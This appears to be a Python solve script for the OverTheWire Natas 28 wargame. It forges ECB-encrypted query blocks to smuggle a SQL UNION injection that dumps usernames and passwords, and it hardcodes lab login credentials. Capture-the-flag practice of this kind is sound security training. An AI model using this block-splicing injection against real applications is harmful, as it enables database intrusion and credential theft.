import urllib.request as url
import urllib.parse
import string
import subprocess
import base64
import requests

NATAS_URL = 'http://natas28.natas.labs.overthewire.org/index.php'
NATAS_USERNAME = 'natas28'
NATAS_PWD = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'


def initialPageConnexion():
    '''
    Connects to the page with the given credentials. This function
    has to be called before trying anything on the webpage.
    '''
    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password(
        'Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    # This commented out tactic also works. The website accepts the Authorization header
    # after having connected at least once

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    # with open('output.html', 'w') as file:
    #     file.write(output.read().decode())


def correspondingQuery(string, url=NATAS_URL, text=False, query=False):
    '''
    Determines if the string is the correct id or not

        Parameters:
            string : The id

        Returns:
            True if the id is correct. False otherwise
    '''
    request = requests.post(url, data={'query': string}, auth=(NATAS_USERNAME, NATAS_PWD))
    if text:
        return request.text
    if query:
        return base64.b64decode(urllib.parse.unquote(request.url.split("query=")[1]))


def base64_equivalent_query(number):
    # if (number < 16):
    #     number = hex(number)
    #     number = f'0{number[2:]}'
    # else:
    #     number = hex(number)
    #     number = f'{number[2:]}'
    return subprocess.check_output(['natas28/tob64.sh', number]).decode().strip()


if __name__ == "__main__":

    initialPageConnexion()

    guinea_pig_plaintext = "A" * 10 + "B" * 14
    guinea_pig_ciphertext = correspondingQuery(guinea_pig_plaintext, query=True)

    sql_command = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"
    query = "A" * 10 + sql_command + 'B' * (16 - (len(sql_command) % 16))
    offset = 48 + len(query) - 10

    enciphered_sql_query = correspondingQuery(query, query=True)
    encrypted_sql_command = enciphered_sql_query[48:offset]

    forged_query = guinea_pig_ciphertext[:64] + encrypted_sql_command + guinea_pig_ciphertext[64:]
    password = correspondingQuery(base64.b64encode(forged_query), url='http://natas28.natas.labs.overthewire.org/search.php', text=True)
    print(f"Password is {password}")

# Il y a beaucoup de choses que je n'ai pas compris dans ce script. 
# La source se trouve ici: http://alkalinesecurity.com/blog/ctf-writeups/natas-28-getting-it-wrong/